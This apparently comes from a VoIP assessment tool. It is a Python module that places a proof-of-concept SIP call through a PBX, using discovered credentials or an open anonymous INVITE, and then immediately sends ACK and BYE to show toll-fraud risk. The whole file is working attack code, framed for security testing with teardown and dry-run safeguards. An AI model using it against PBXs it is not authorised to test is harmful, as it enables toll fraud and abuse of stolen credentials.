"""Outbound call proof-of-concept.

Places a single SIP INVITE toward the PBX and either:
  - auth is required: uses the discovered credentials to auth
  - anonymous-INVITE is open: no creds needed

On 200 OK, we send ACK (call established) then immediately BYE.
No audio is streamed. No phone rings beyond the brief ringback the PBX would
produce. The goal is to *prove* that the PBX would carry a call to the dial
plan destination — this is the toll-fraud risk demonstration.

SAFETY:
  - Requires explicit call_to number
  - Drops the call at 200 OK (ACK then BYE)
  - Optional --dry-run stops after the 100/180 provisional, before 200 OK
"""
from __future__ import annotations

import time
from dataclasses import dataclass

from . import sip
from .utils import local_ip_for, rand_call_id, rand_tag


@dataclass
class CallResult:
    success: bool        # reached 200 OK (or provisional in dry-run)
    reached_dialplan: bool   # got 100/180/183 - PBX actually tried the route
    status_code: int | None
    reason: str
    evidence: str
    sip_trace: list[str]


def _sdp(local_ip: str, rtp_port: int = 49170) -> str:
    return (
        "v=0\r\n"
        f"o=scanner 0 0 IN IP4 {local_ip}\r\n"
        "s=voip-scan-poc\r\n"
        f"c=IN IP4 {local_ip}\r\n"
        "t=0 0\r\n"
        f"m=audio {rtp_port} RTP/AVP 0\r\n"
        "a=rtpmap:0 PCMU/8000\r\n"
        "a=sendrecv\r\n"
    )


def place_call(
    host: str,
    call_to: str,
    call_from: str,
    port: int = 5060,
    username: str | None = None,
    password: str | None = None,
    timeout: float = 5.0,
    dry_run: bool = False,
    max_wait: float = 10.0,
    traffic_log=None,
) -> CallResult:
    """Send INVITE; handle 401 re-auth; on 200 OK send ACK then BYE."""
    import socket

    local_ip = local_ip_for(host)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    s.bind(("", 0))
    local_port = s.getsockname()[1]

    call_id = rand_call_id()
    tag_from = rand_tag()
    uri = f"sip:{call_to}@{host}"
    trace: list[str] = []

    def send(msg: bytes) -> None:
        if traffic_log:
            traffic_log.log("OUT", f"{host}:{port}", msg)
        s.sendto(msg, (host, port))

    def recv_one() -> bytes | None:
        try:
            data, _ = s.recvfrom(65535)
            if traffic_log:
                traffic_log.log("IN", f"{host}:{port}", data)
            return data
        except socket.timeout:
            return None

    # 1) Initial INVITE
    invite = sip.build_message(
        "INVITE", uri,
        from_user=call_from, to_user=call_to,
        host=host, port=port,
        local_ip=local_ip, local_port=local_port,
        call_id=call_id, cseq=1, from_tag=tag_from,
        body=_sdp(local_ip),
    )
    send(invite)
    trace.append(f"> INVITE sip:{call_to}@{host}")

    deadline = time.monotonic() + max_wait
    final: sip.SipResponse | None = None
    reached_dialplan = False
    last_to_tag: str | None = None
    auth_attempted = False

    try:
        while time.monotonic() < deadline:
            data = recv_one()
            if not data:
                continue
            resp = sip.parse_response(data)
            if not resp:
                continue
            trace.append(f"< {resp.status_code} {resp.reason}")

            # Extract to-tag for ACK/BYE routing if present
            to = resp.headers.get("to", "")
            if ";tag=" in to:
                last_to_tag = to.split(";tag=", 1)[1].split(";")[0].split(",")[0].strip()

            if resp.status_code in (100, 180, 183):
                reached_dialplan = True
                if dry_run and resp.status_code in (180, 183):
                    final = resp
                    break
                continue

            if resp.is_auth_required and not auth_attempted:
                if not (username and password):
                    final = resp
                    break
                auth_attempted = True
                # Re-INVITE with auth
                params = resp.auth_params
                hdr_name = ("Proxy-Authorization"
                            if resp.status_code == 407 else "Authorization")
                auth_header = sip.build_auth_header(
                    username, password, "INVITE", uri, params,
                    header_name=hdr_name,
                )
                # ACK the 401/407 first (per RFC within same dialog)
                ack = sip.build_message(
                    "ACK", uri,
                    from_user=call_from, to_user=call_to,
                    host=host, port=port,
                    local_ip=local_ip, local_port=local_port,
                    call_id=call_id, cseq=1, from_tag=tag_from,
                    to_tag=last_to_tag,
                )
                send(ack)
                trace.append("> ACK (to 401)")

                invite2 = sip.build_message(
                    "INVITE", uri,
                    from_user=call_from, to_user=call_to,
                    host=host, port=port,
                    local_ip=local_ip, local_port=local_port,
                    call_id=call_id, cseq=2, from_tag=tag_from,
                    auth_header=auth_header,
                    body=_sdp(local_ip),
                )
                send(invite2)
                trace.append("> INVITE (auth)")
                continue

            if 200 <= resp.status_code < 300:
                final = resp
                # Complete handshake + hang up
                ack = sip.build_message(
                    "ACK", uri,
                    from_user=call_from, to_user=call_to,
                    host=host, port=port,
                    local_ip=local_ip, local_port=local_port,
                    call_id=call_id, cseq=resp.headers.get("cseq","1").split()[0],
                    from_tag=tag_from, to_tag=last_to_tag,
                )
                send(ack)
                trace.append("> ACK")
                bye = sip.build_message(
                    "BYE", uri,
                    from_user=call_from, to_user=call_to,
                    host=host, port=port,
                    local_ip=local_ip, local_port=local_port,
                    call_id=call_id, cseq=3, from_tag=tag_from,
                    to_tag=last_to_tag,
                )
                send(bye)
                trace.append("> BYE (tearing down immediately)")
                break

            if resp.status_code >= 400:
                final = resp
                break
    finally:
        s.close()

    if not final:
        return CallResult(
            success=False, reached_dialplan=reached_dialplan,
            status_code=None, reason="timeout",
            evidence="no final response before max_wait",
            sip_trace=trace,
        )

    success = 200 <= final.status_code < 300 or (dry_run and reached_dialplan)
    evidence = f"{final.status_code} {final.reason}"
    if success and dry_run:
        evidence += " (dry-run: stopped at provisional — dialplan engaged)"
    elif success:
        evidence += " (200 OK received — call established; tore down with BYE)"
    return CallResult(
        success=success,
        reached_dialplan=reached_dialplan,
        status_code=final.status_code,
        reason=final.reason,
        evidence=evidence,
        sip_trace=trace,
    )
